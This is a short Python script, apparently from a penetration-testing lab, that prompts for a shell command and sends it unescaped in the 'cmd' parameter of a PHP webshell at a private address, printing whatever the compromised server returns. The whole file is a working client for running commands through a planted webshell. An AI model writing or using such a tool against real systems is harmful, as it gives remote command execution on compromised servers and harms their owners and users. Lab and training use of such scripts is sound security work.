#!/usr/bin/env python
# the requests module will handle the web requests for us
# you'll need to run 'pip3 install requests' to install it
import requests

# grab the requested command from the user
command = input("cmd: ")

# create a request to the php webshell (no error handling)
r = requests.get('http://192.168.97.135/shell.php?cmd=' + command)

# print the results and exit
print(r.text)
